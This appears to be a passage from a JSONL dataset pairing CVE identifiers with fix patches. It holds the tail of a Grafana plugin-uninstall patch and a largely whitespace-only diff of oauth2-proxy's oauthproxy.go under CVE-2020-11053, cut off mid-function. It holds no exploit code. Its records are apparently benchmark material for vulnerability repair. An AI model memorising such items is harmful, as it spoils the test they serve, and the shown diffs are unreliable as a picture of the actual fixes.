:= hs.pluginStore.Remove(c.Req.Context(), pluginID)\n+        if err != nil {\n+                if errors.Is(err, plugins.ErrPluginNotInstalled) {\n+                        return response.Error(http.StatusNotFound, \"Plugin not installed\", err)\n+                }\n+                if errors.Is(err, plugins.ErrUninstallCorePlugin) {\n+                        return response.Error(http.StatusForbidden, \"Cannot uninstall a Core plugin\", err)\n+                }\n+                if errors.Is(err, plugins.ErrUninstallOutsideOfPluginDir) {\n+                        return response.Error(http.StatusForbidden, \"Cannot uninstall a plugin outside of the plugins directory\", err)\n+                }\n+\n+                return response.Error(http.StatusInternalServerError, \"Failed to uninstall plugin\", err)\n+        }\n+        return response.JSON(http.StatusOK, []byte{})\n }\n \n func translatePluginRequestErrorToAPIError(err error) response.Response {\n-\tif errors.Is(err, backendplugin.ErrPluginNotRegistered) {\n-\t\treturn response.Error(404, \"Plugin not found\", err)\n-\t}\n+        if errors.Is(err, backendplugin.ErrPluginNotRegistered) {\n+                return response.Error(404, \"Plugin not found\", err)\n+        }\n \n-\tif errors.Is(err, backendplugin.ErrMethodNotImplemented) {\n-\t\treturn response.Error(404, \"Not found\", err)\n-\t}\n+        if errors.Is(err, backendplugin.ErrMethodNotImplemented) {\n+                return response.Error(404, \"Not found\", err)\n+        }\n \n-\tif errors.Is(err, backendplugin.ErrHealthCheckFailed) {\n-\t\treturn response.Error(500, \"Plugin health check failed\", err)\n-\t}\n+        if errors.Is(err, backendplugin.ErrHealthCheckFailed) {\n+                return response.Error(500, \"Plugin health check failed\", err)\n+        }\n \n-\tif errors.Is(err, backendplugin.ErrPluginUnavailable) {\n-\t\treturn response.Error(503, \"Plugin unavailable\", err)\n-\t}\n+        if errors.Is(err, backendplugin.ErrPluginUnavailable) {\n+                return response.Error(503, \"Plugin unavailable\", err)\n+        }\n \n-\treturn response.Error(500, \"Plugin request failed\", err)\n+        return response.Error(500, \"Plugin request failed\", err)\n }\n \n func (hs *HTTPServer) pluginMarkdown(ctx context.Context, pluginId string, name string) ([]byte, error) {\n-\tplugin, exists := hs.pluginStore.Plugin(ctx, pluginId)\n-\tif !exists {\n-\t\treturn nil, plugins.NotFoundError{PluginID: pluginId}\n-\t}\n-\n-\t// nolint:gosec\n-\t// We can ignore the gosec G304 warning on this one because `plugin.PluginDir` is based\n-\t// on plugin the folder structure on disk and not user input.\n-\tpath := filepath.Join(plugin.PluginDir, fmt.Sprintf(\"%s.md\", strings.ToUpper(name)))\n-\texists, err := fs.Exists(path)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif !exists {\n-\t\tpath = filepath.Join(plugin.PluginDir, fmt.Sprintf(\"%s.md\", strings.ToLower(name)))\n-\t}\n-\n-\texists, err = fs.Exists(path)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif !exists {\n-\t\treturn make([]byte, 0), nil\n-\t}\n-\n-\t// nolint:gosec\n-\t// We can ignore the gosec G304 warning on this one because `plugin.PluginDir` is based\n-\t// on plugin the folder structure on disk and not user input.\n-\tdata, err := ioutil.ReadFile(path)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn data, nil\n+        plugin, exists := hs.pluginStore.Plugin(ctx, pluginId)\n+        if !exists {\n+                return nil, plugins.NotFoundError{PluginID: pluginId}\n+        }\n+\n+        // nolint:gosec\n+        // We can ignore the gosec G304 warning on this one because `plugin.PluginDir` is based\n+        // on plugin the folder structure on disk and not user input.\n+        path := filepath.Join(plugin.PluginDir, fmt.Sprintf(\"%s.md\", strings.ToUpper(name)))\n+        exists, err := fs.Exists(path)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if !exists {\n+                path = filepath.Join(plugin.PluginDir, fmt.Sprintf(\"%s.md\", strings.ToLower(name)))\n+        }\n+\n+        exists, err = fs.Exists(path)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if !exists {\n+                return make([]byte, 0), nil\n+        }\n+\n+        // nolint:gosec\n+        // We can ignore the gosec G304 warning on this one because `plugin.PluginDir` is based\n+        // on plugin the folder structure on disk and not user input.\n+        data, err := ioutil.ReadFile(path)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return data, nil\n }\n"}
{"cve":"CVE-2020-11053:0708", "fix_patch": "diff --git a/oauthproxy.go b/oauthproxy.go\nindex 587215fd..34a1f547 100644\n--- a/oauthproxy.go\n+++ b/oauthproxy.go\n@@ -1,541 +1,541 @@\n package main\n \n import (\n-\t\"context\"\n-\t\"crypto/tls\"\n-\tb64 \"encoding/base64\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"html/template\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/http/httputil\"\n-\t\"net/url\"\n-\t\"regexp\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/coreos/go-oidc\"\n-\t\"github.com/mbland/hmacauth\"\n-\tsessionsapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/sessions\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/cookies\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/encryption\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/logger\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/providers\"\n-\t\"github.com/yhat/wsutil\"\n+        \"context\"\n+        \"crypto/tls\"\n+        b64 \"encoding/base64\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"html/template\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/http/httputil\"\n+        \"net/url\"\n+        \"regexp\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/coreos/go-oidc\"\n+        \"github.com/mbland/hmacauth\"\n+        sessionsapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/sessions\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/cookies\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/encryption\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/logger\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/providers\"\n+        \"github.com/yhat/wsutil\"\n )\n \n const (\n-\t// SignatureHeader is the name of the request header containing the GAP Signature\n-\t// Part of hmacauth\n-\tSignatureHeader = \"GAP-Signature\"\n+        // SignatureHeader is the name of the request header containing the GAP Signature\n+        // Part of hmacauth\n+        SignatureHeader = \"GAP-Signature\"\n \n-\thttpScheme  = \"http\"\n-\thttpsScheme = \"https\"\n+        httpScheme  = \"http\"\n+        httpsScheme = \"https\"\n \n-\tapplicationJSON = \"application/json\"\n+        applicationJSON = \"application/json\"\n )\n \n // SignatureHeaders contains the headers to be signed by the hmac algorithm\n // Part of hmacauth\n var SignatureHeaders = []string{\n-\t\"Content-Length\",\n-\t\"Content-Md5\",\n-\t\"Content-Type\",\n-\t\"Date\",\n-\t\"Authorization\",\n-\t\"X-Forwarded-User\",\n-\t\"X-Forwarded-Email\",\n-\t\"X-Forwarded-Preferred-User\",\n-\t\"X-Forwarded-Access-Token\",\n-\t\"Cookie\",\n-\t\"Gap-Auth\",\n+        \"Content-Length\",\n+        \"Content-Md5\",\n+        \"Content-Type\",\n+        \"Date\",\n+        \"Authorization\",\n+        \"X-Forwarded-User\",\n+        \"X-Forwarded-Email\",\n+        \"X-Forwarded-Preferred-User\",\n+        \"X-Forwarded-Access-Token\",\n+        \"Cookie\",\n+        \"Gap-Auth\",\n }\n \n var (\n-\t// ErrNeedsLogin means the user should be redirected to the login page\n-\tErrNeedsLogin = errors.New(\"redirect to login page\")\n+        // ErrNeedsLogin means the user should be redirected to the login page\n+        ErrNeedsLogin = errors.New(\"redirect to login page\")\n )\n \n // OAuthProxy is the main authentication proxy\n type OAuthProxy struct {\n-\tCookieSeed     string\n-\tCookieName     string\n-\tCSRFCookieName string\n-\tCookieDomains  []string\n-\tCookiePath     string\n-\tCookieSecure   bool\n-\tCookieHTTPOnly bool\n-\tCookieExpire   time.Duration\n-\tCookieRefresh  time.Duration\n-\tCookieSameSite string\n-\tValidator      func(string) bool\n-\n-\tRobotsPath        string\n-\tPingPath          string\n-\tSignInPath        string\n-\tSignOutPath       string\n-\tOAuthStartPath    string\n-\tOAuthCallbackPath string\n-\tAuthOnlyPath      string\n-\tUserInfoPath      string\n-\n-\tredirectURL          *url.URL // the url to receive requests at\n-\twhitelistDomains     []string\n-\tprovider             providers.Provider\n-\tproviderNameOverride string\n-\tsessionStore         sessionsapi.SessionStore\n-\tProxyPrefix          string\n-\tSignInMessage        string\n-\tHtpasswdFile         *HtpasswdFile\n-\tDisplayHtpasswdForm  bool\n-\tserveMux             http.Handler\n-\tSetXAuthRequest      bool\n-\tPassBasicAuth        bool\n-\tSetBasicAuth         bool\n-\tSkipProviderButton   bool\n-\tPassUserHeaders      bool\n-\tBasicAuthPassword    string\n-\tPassAccessToken      bool\n-\tSetAuthorization     bool\n-\tPassAuthorization    bool\n-\tPreferEmailToUser    bool\n-\tskipAuthRegex        []string\n-\tskipAuthPreflight    bool\n-\tskipJwtBearerTokens  bool\n-\tjwtBearerVerifiers   []*oidc.IDTokenVerifier\n-\tcompiledRegex        []*regexp.Regexp\n-\ttemplates            *template.Template\n-\tBanner               string\n-\tFooter               string\n+        CookieSeed     string\n+        CookieName     string\n+        CSRFCookieName string\n+        CookieDomains  []string\n+        CookiePath     string\n+        CookieSecure   bool\n+        CookieHTTPOnly bool\n+        CookieExpire   time.Duration\n+        CookieRefresh  time.Duration\n+        CookieSameSite string\n+        Validator      func(string) bool\n+\n+        RobotsPath        string\n+        PingPath          string\n+        SignInPath        string\n+        SignOutPath       string\n+        OAuthStartPath    string\n+        OAuthCallbackPath string\n+        AuthOnlyPath      string\n+        UserInfoPath      string\n+\n+        redirectURL          *url.URL // the url to receive requests at\n+        whitelistDomains     []string\n+        provider             providers.Provider\n+        providerNameOverride string\n+        sessionStore         sessionsapi.SessionStore\n+        ProxyPrefix          string\n+        SignInMessage        string\n+        HtpasswdFile         *HtpasswdFile\n+        DisplayHtpasswdForm  bool\n+        serveMux             http.Handler\n+        SetXAuthRequest      bool\n+        PassBasicAuth        bool\n+        SetBasicAuth         bool\n+        SkipProviderButton   bool\n+        PassUserHeaders      bool\n+        BasicAuthPassword    string\n+        PassAccessToken      bool\n+        SetAuthorization     bool\n+        PassAuthorization    bool\n+        PreferEmailToUser    bool\n+        skipAuthRegex        []string\n+        skipAuthPreflight    bool\n+        skipJwtBearerTokens  bool\n+        jwtBearerVerifiers   []*oidc.IDTokenVerifier\n+        compiledRegex        []*regexp.Regexp\n+        templates            *template.Template\n+        Banner               string\n+        Footer               string\n }\n \n // UpstreamProxy represents an upstream server to proxy to\n type UpstreamProxy struct {\n-\tupstream  string\n-\thandler   http.Handler\n-\twsHandler http.Handler\n-\tauth      hmacauth.HmacAuth\n+        upstream  string\n+        handler   http.Handler\n+        wsHandler http.Handler\n+        auth      hmacauth.HmacAuth\n }\n \n // ServeHTTP proxies requests to the upstream provider while signing the\n // request headers\n func (u *UpstreamProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n-\tw.Header().Set(\"GAP-Upstream-Address\", u.upstream)\n-\tif u.auth != nil {\n-\t\tr.Header.Set(\"GAP-Auth\", w.Header().Get(\"GAP-Auth\"))\n-\t\tu.auth.SignRequest(r)\n-\t}\n-\tif u.wsHandler != nil && strings.EqualFold(r.Header.Get(\"Connection\"), \"upgrade\") && r.Header.Get(\"Upgrade\") == \"websocket\" {\n-\t\tu.wsHandler.ServeHTTP(w, r)\n-\t} else {\n-\t\tu.handler.ServeHTTP(w, r)\n-\t}\n+        w.Header().Set(\"GAP-Upstream-Address\", u.upstream)\n+        if u.auth != nil {\n+                r.Header.Set(\"GAP-Auth\", w.Header().Get(\"GAP-Auth\"))\n+                u.auth.SignRequest(r)\n+        }\n+        if u.wsHandler != nil && strings.EqualFold(r.Header.Get(\"Connection\"), \"upgrade\") && r.Header.Get(\"Upgrade\") == \"websocket\" {\n+                u.wsHandler.ServeHTTP(w, r)\n+        } else {\n+                u.handler.ServeHTTP(w, r)\n+        }\n \n }\n \n // NewReverseProxy creates a new reverse proxy for proxying requests to upstream\n // servers\n func NewReverseProxy(target *url.URL, opts *Options) (proxy *httputil.ReverseProxy) {\n-\tproxy = httputil.NewSingleHostReverseProxy(target)\n-\tproxy.FlushInterval = opts.FlushInterval\n-\tif opts.SSLUpstreamInsecureSkipVerify {\n-\t\tproxy.Transport = &http.Transport{\n-\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n-\t\t}\n-\t}\n-\treturn proxy\n+        proxy = httputil.NewSingleHostReverseProxy(target)\n+        proxy.FlushInterval = opts.FlushInterval\n+        if opts.SSLUpstreamInsecureSkipVerify {\n+                proxy.Transport = &http.Transport{\n+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n+                }\n+        }\n+        return proxy\n }\n \n func setProxyUpstreamHostHeader(proxy *httputil.ReverseProxy, target *url.URL) {\n-\tdirector := proxy.Director\n-\tproxy.Director = func(req *http.Request) {\n-\t\tdirector(req)\n-\t\t// use RequestURI so that we aren't unescaping encoded slashes in the request path\n-\t\treq.Host = target.Host\n-\t\treq.URL.Opaque = req.RequestURI\n-\t\treq.URL.RawQuery = \"\"\n-\t}\n+        director := proxy.Director\n+        proxy.Director = func(req *http.Request) {\n+                director(req)\n+                // use RequestURI so that we aren't unescaping encoded slashes in the request path\n+                req.Host = target.Host\n+                req.URL.Opaque = req.RequestURI\n+                req.URL.RawQuery = \"\"\n+        }\n }\n \n func setProxyDirector(proxy *httputil.ReverseProxy) {\n-\tdirector := proxy.Director\n-\tproxy.Director = func(req *http.Request) {\n-\t\tdirector(req)\n-\t\t// use RequestURI so that we aren't unescaping encoded slashes in the request path\n-\t\treq.URL.Opaque = req.RequestURI\n-\t\treq.URL.RawQuery = \"\"\n-\t}\n+        director := proxy.Director\n+        proxy.Director = func(req *http.Request) {\n+                director(req)\n+                // use RequestURI so that we aren't unescaping encoded slashes in the request path\n+                req.URL.Opaque = req.RequestURI\n+                req.URL.RawQuery = \"\"\n+        }\n }\n \n // NewFileServer creates a http.Handler to serve files from the filesystem\n func NewFileServer(path string, filesystemPath string) (proxy http.Handler) {\n-\treturn http.StripPrefix(path, http.FileServer(http.Dir(filesystemPath)))\n+        return http.StripPrefix(path, http.FileServer(http.Dir(filesystemPath)))\n }\n \n // NewWebSocketOrRestReverseProxy creates a reverse proxy for REST or websocket based on url\n func NewWebSocketOrRestReverseProxy(u *url.URL, opts *Options, auth hmacauth.HmacAuth) http.Handler {\n-\tu.Path = \"\"\n-\tproxy := NewReverseProxy(u, opts)\n-\tif !opts.PassHostHeader {\n-\t\tsetProxyUpstreamHostHeader(proxy, u)\n-\t} else {\n-\t\tsetProxyDirector(proxy)\n-\t}\n-\n-\t// this should give us a wss:// scheme if the url is https:// based.\n-\tvar wsProxy *wsutil.ReverseProxy\n-\tif opts.ProxyWebSockets {\n-\t\twsScheme := \"ws\" + strings.TrimPrefix(u.Scheme, \"http\")\n-\t\twsURL := &url.URL{Scheme: wsScheme, Host: u.Host}\n-\t\twsProxy = wsutil.NewSingleHostReverseProxy(wsURL)\n-\t\tif opts.SSLUpstreamInsecureSkipVerify {\n-\t\t\twsProxy.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n-\t\t}\n-\t}\n-\treturn &UpstreamProxy{\n-\t\tupstream:  u.Host,\n-\t\thandler:   proxy,\n-\t\twsHandler: wsProxy,\n-\t\tauth:      auth,\n-\t}\n+        u.Path = \"\"\n+        proxy := NewReverseProxy(u, opts)\n+        if !opts.PassHostHeader {\n+                setProxyUpstreamHostHeader(proxy, u)\n+        } else {\n+                setProxyDirector(proxy)\n+        }\n+\n+        // this should give us a wss:// scheme if the url is https:// based.\n+        var wsProxy *wsutil.ReverseProxy\n+        if opts.ProxyWebSockets {\n+                wsScheme := \"ws\" + strings.TrimPrefix(u.Scheme, \"http\")\n+                wsURL := &url.URL{Scheme: wsScheme, Host: u.Host}\n+                wsProxy = wsutil.NewSingleHostReverseProxy(wsURL)\n+                if opts.SSLUpstreamInsecureSkipVerify {\n+                        wsProxy.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n+                }\n+        }\n+        return &UpstreamProxy{\n+                upstream:  u.Host,\n+                handler:   proxy,\n+                wsHandler: wsProxy,\n+                auth:      auth,\n+        }\n }\n \n // NewOAuthProxy creates a new instance of OAuthProxy from the options provided\n func NewOAuthProxy(opts *Options, validator func(string) bool) *OAuthProxy {\n-\tserveMux := http.NewServeMux()\n-\tvar auth hmacauth.HmacAuth\n-\tif sigData := opts.signatureData; sigData != nil {\n-\t\tauth = hmacauth.NewHmacAuth(sigData.hash, []byte(sigData.key),\n-\t\t\tSignatureHeader, SignatureHeaders)\n-\t}\n-\tfor _, u := range opts.proxyURLs {\n-\t\tpath := u.Path\n-\t\thost := u.Host\n-\t\tswitch u.Scheme {\n-\t\tcase httpScheme, httpsScheme:\n-\t\t\tlogger.Printf(\"mapping path %q => upstream %q\", path, u)\n-\t\t\tproxy := NewWebSocketOrRestReverseProxy(u, opts, auth)\n-\t\t\tserveMux.Handle(path, proxy)\n-\t\tcase \"static\":\n-\t\t\tresponseCode, err := strconv.Atoi(host)\n-\t\t\tif err != nil {\n-\t\t\t\tlogger.Printf(\"unable to convert %q to int, use default \\\"200\\\"\", host)\n-\t\t\t\tresponseCode = 200\n-\t\t\t}\n-\n-\t\t\tserveMux.HandleFunc(path, func(rw http.ResponseWriter, req *http.Request) {\n-\t\t\t\trw.WriteHeader(responseCode)\n-\t\t\t\tfmt.Fprintf(rw, \"Authenticated\")\n-\t\t\t})\n-\t\tcase \"file\":\n-\t\t\tif u.Fragment != \"\" {\n-\t\t\t\tpath = u.Fragment\n-\t\t\t}\n-\t\t\tlogger.Printf(\"mapping path %q => file system %q\", path, u.Path)\n-\t\t\tproxy := NewFileServer(path, u.Path)\n-\t\t\tuProxy := UpstreamProxy{\n-\t\t\t\tupstream:  path,\n-\t\t\t\thandler:   proxy,\n-\t\t\t\twsHandler: nil,\n-\t\t\t\tauth:      nil,\n-\t\t\t}\n-\t\t\tserveMux.Handle(path, &uProxy)\n-\t\tdefault:\n-\t\t\tpanic(fmt.Sprintf(\"unknown upstream protocol %s\", u.Scheme))\n-\t\t}\n-\t}\n-\tfor _, u := range opts.compiledRegex {\n-\t\tlogger.Printf(\"compiled skip-auth-regex => %q\", u)\n-\t}\n-\n-\tif opts.SkipJwtBearerTokens {\n-\t\tlogger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n-\t\tfor _, issuer := range opts.ExtraJwtIssuers {\n-\t\t\tlogger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n-\t\t}\n-\t}\n-\tredirectURL := opts.redirectURL\n-\tif redirectURL.Path == \"\" {\n-\t\tredirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n-\t}\n-\n-\tlogger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.provider.Data().ProviderName, opts.ClientID)\n-\trefresh := \"disabled\"\n-\tif opts.Cookie.Refresh != time.Duration(0) {\n-\t\trefresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n-\t}\n-\n-\tlogger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n-\n-\treturn &OAuthProxy{\n-\t\tCookieName:     opts.Cookie.Name,\n-\t\tCSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n-\t\tCookieSeed:     opts.Cookie.Secret,\n-\t\tCookieDomains:  opts.Cookie.Domains,\n-\t\tCookiePath:     opts.Cookie.Path,\n-\t\tCookieSecure:   opts.Cookie.Secure,\n-\t\tCookieHTTPOnly: opts.Cookie.HTTPOnly,\n-\t\tCookieExpire:   opts.Cookie.Expire,\n-\t\tCookieRefresh:  opts.Cookie.Refresh,\n-\t\tCookieSameSite: opts.Cookie.SameSite,\n-\t\tValidator:      validator,\n-\n-\t\tRobotsPath:        \"/robots.txt\",\n-\t\tPingPath:          opts.PingPath,\n-\t\tSignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n-\t\tSignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n-\t\tOAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n-\t\tOAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n-\t\tAuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n-\t\tUserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n-\n-\t\tProxyPrefix:          opts.ProxyPrefix,\n-\t\tprovider:             opts.provider,\n-\t\tproviderNameOverride: opts.ProviderName,\n-\t\tsessionStore:         opts.sessionStore,\n-\t\tserveMux:             serveMux,\n-\t\tredirectURL:          redirectURL,\n-\t\twhitelistDomains:     opts.WhitelistDomains,\n-\t\tskipAuthRegex:        opts.SkipAuthRegex,\n-\t\tskipAuthPreflight:    opts.SkipAuthPreflight,\n-\t\tskipJwtBearerTokens:  opts.SkipJwtBearerTokens,\n-\t\tjwtBearerVerifiers:   opts.jwtBearerVerifiers,\n-\t\tcompiledRegex:        opts.compiledRegex,\n-\t\tSetXAuthRequest:      opts.SetXAuthRequest,\n-\t\tPassBasicAuth:        opts.PassBasicAuth,\n-\t\tSetBasicAuth:         opts.SetBasicAuth,\n-\t\tPassUserHeaders:      opts.PassUserHeaders,\n-\t\tBasicAuthPassword:    opts.BasicAuthPassword,\n-\t\tPassAccessToken:      opts.PassAccessToken,\n-\t\tSetAuthorization:     opts.SetAuthorization,\n-\t\tPassAuthorization:    opts.PassAuthorization,\n-\t\tPreferEmailToUser:    opts.PreferEmailToUser,\n-\t\tSkipProviderButton:   opts.SkipProviderButton,\n-\t\ttemplates:            loadTemplates(opts.CustomTemplatesDir),\n-\t\tBanner:               opts.Banner,\n-\t\tFooter:               opts.Footer,\n-\t}\n+        serveMux := http.NewServeMux()\n+        var auth hmacauth.HmacAuth\n+        if sigData := opts.signatureData; sigData != nil {\n+                auth = hmacauth.NewHmacAuth(sigData.hash, []byte(sigData.key),\n+                        SignatureHeader, SignatureHeaders)\n+        }\n+        for _, u := range opts.proxyURLs {\n+                path := u.Path\n+                host := u.Host\n+                switch u.Scheme {\n+                case httpScheme, httpsScheme:\n+                        logger.Printf(\"mapping path %q => upstream %q\", path, u)\n+                        proxy := NewWebSocketOrRestReverseProxy(u, opts, auth)\n+                        serveMux.Handle(path, proxy)\n+                case \"static\":\n+                        responseCode, err := strconv.Atoi(host)\n+                        if err != nil {\n+                                logger.Printf(\"unable to convert %q to int, use default \\\"200\\\"\", host)\n+                                responseCode = 200\n+                        }\n+\n+                        serveMux.HandleFunc(path, func(rw http.ResponseWriter, req *http.Request) {\n+                                rw.WriteHeader(responseCode)\n+                                fmt.Fprintf(rw, \"Authenticated\")\n+                        })\n+                case \"file\":\n+                        if u.Fragment != \"\" {\n+                                path = u.Fragment\n+                        }\n+                        logger.Printf(\"mapping path %q => file system %q\", path, u.Path)\n+                        proxy := NewFileServer(path, u.Path)\n+                        uProxy := UpstreamProxy{\n+                                upstream:  path,\n+                                handler:   proxy,\n+                                wsHandler: nil,\n+                                auth:      nil,\n+                        }\n+                        serveMux.Handle(path, &uProxy)\n+                default:\n+                        panic(fmt.Sprintf(\"unknown upstream protocol %s\", u.Scheme))\n+                }\n+        }\n+        for _, u := range opts.compiledRegex {\n+                logger.Printf(\"compiled skip-auth-regex => %q\", u)\n+        }\n+\n+        if opts.SkipJwtBearerTokens {\n+                logger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n+                for _, issuer := range opts.ExtraJwtIssuers {\n+                        logger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n+                }\n+        }\n+        redirectURL := opts.redirectURL\n+        if redirectURL.Path == \"\" {\n+                redirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n+        }\n+\n+        logger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.provider.Data().ProviderName, opts.ClientID)\n+        refresh := \"disabled\"\n+        if opts.Cookie.Refresh != time.Duration(0) {\n+                refresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n+        }\n+\n+        logger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n+\n+        return &OAuthProxy{\n+                CookieName:     opts.Cookie.Name,\n+                CSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n+                CookieSeed:     opts.Cookie.Secret,\n+                CookieDomains:  opts.Cookie.Domains,\n+                CookiePath:     opts.Cookie.Path,\n+                CookieSecure:   opts.Cookie.Secure,\n+                CookieHTTPOnly: opts.Cookie.HTTPOnly,\n+                CookieExpire:   opts.Cookie.Expire,\n+                CookieRefresh:  opts.Cookie.Refresh,\n+                CookieSameSite: opts.Cookie.SameSite,\n+                Validator:      validator,\n+\n+                RobotsPath:        \"/robots.txt\",\n+                PingPath:          opts.PingPath,\n+                SignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n+                SignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n+                OAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n+                OAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n+                AuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n+                UserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n+\n+                ProxyPrefix:          opts.ProxyPrefix,\n+                provider:             opts.provider,\n+                providerNameOverride: opts.ProviderName,\n+                sessionStore:         opts.sessionStore,\n+                serveMux:             serveMux,\n+                redirectURL:          redirectURL,\n+                whitelistDomains:     opts.WhitelistDomains,\n+                skipAuthRegex:        opts.SkipAuthRegex,\n+                skipAuthPreflight:    opts.SkipAuthPreflight,\n+                skipJwtBearerTokens:  opts.SkipJwtBearerTokens,\n+                jwtBearerVerifiers:   opts.jwtBearerVerifiers,\n+                compiledRegex:        opts.compiledRegex,\n+                SetXAuthRequest:      opts.SetXAuthRequest,\n+                PassBasicAuth:        opts.PassBasicAuth,\n+                SetBasicAuth:         opts.SetBasicAuth,\n+                PassUserHeaders:      opts.PassUserHeaders,\n+                BasicAuthPassword:    opts.BasicAuthPassword,\n+                PassAccessToken:      opts.PassAccessToken,\n+                SetAuthorization:     opts.SetAuthorization,\n+                PassAuthorization:    opts.PassAuthorization,\n+                PreferEmailToUser:    opts.PreferEmailToUser,\n+                SkipProviderButton:   opts.SkipProviderButton,\n+                templates:            loadTemplates(opts.CustomTemplatesDir),\n+                Banner:               opts.Banner,\n+                Footer:               opts.Footer,\n+        }\n }\n \n // GetRedirectURI returns the redirectURL that the upstream OAuth Provider will\n // redirect clients to once authenticated\n func (p *OAuthProxy) GetRedirectURI(host string) string {\n-\t// default to the request Host if not set\n-\tif p.redirectURL.Host != \"\" {\n-\t\treturn p.redirectURL.String()\n-\t}\n-\tu := *p.redirectURL\n-\tif u.Scheme == \"\" {\n-\t\tif p.CookieSecure {\n-\t\t\tu.Scheme = httpsScheme\n-\t\t} else {\n-\t\t\tu.Scheme = httpScheme\n-\t\t}\n-\t}\n-\tu.Host = host\n-\treturn u.String()\n+        // default to the request Host if not set\n+        if p.redirectURL.Host != \"\" {\n+                return p.redirectURL.String()\n+        }\n+        u := *p.redirectURL\n+        if u.Scheme == \"\" {\n+                if p.CookieSecure {\n+                        u.Scheme = httpsScheme\n+                } else {\n+                        u.Scheme = httpScheme\n+                }\n+        }\n+        u.Host = host\n+        return u.String()\n }\n \n func (p *OAuthProxy) displayCustomLoginForm() bool {\n-\treturn p.HtpasswdFile != nil && p.DisplayHtpasswdForm\n+        return p.HtpasswdFile != nil && p.DisplayHtpasswdForm\n }\n \n func (p *OAuthProxy) redeemCode(host, code string) (s *sessionsapi.SessionState, err error) {\n-\tif code == \"\" {\n-\t\treturn nil, errors.New(\"missing code\")\n-\t}\n-\tredirectURI := p.GetRedirectURI(host)\n-\ts, err = p.provider.Redeem(redirectURI, code)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tif s.Email == \"\" {\n-\t\ts.Email, err = p.provider.GetEmailAddress(s)\n-\t}\n-\n-\tif s.PreferredUsername == \"\" {\n-\t\ts.PreferredUsername, err = p.provider.GetPreferredUsername(s)\n-\t\tif err != nil && err.Error() == \"not implemented\" {\n-\t\t\terr = nil\n-\t\t}\n-\t}\n-\n-\tif s.User == \"\" {\n-\t\ts.User, err = p.provider.GetUserName(s)\n-\t\tif err != nil && err.Error() == \"not implemented\" {\n-\t\t\terr = nil\n-\t\t}\n-\t}\n-\treturn\n+        if code == \"\" {\n+                return nil, errors.New(\"missing code\")\n+        }\n+        redirectURI := p.GetRedirectURI(host)\n+        s, err = p.provider.Redeem(redirectURI, code)\n+        if err != nil {\n+                return\n+        }\n+\n+        if s.Email == \"\" {\n+                s.Email, err = 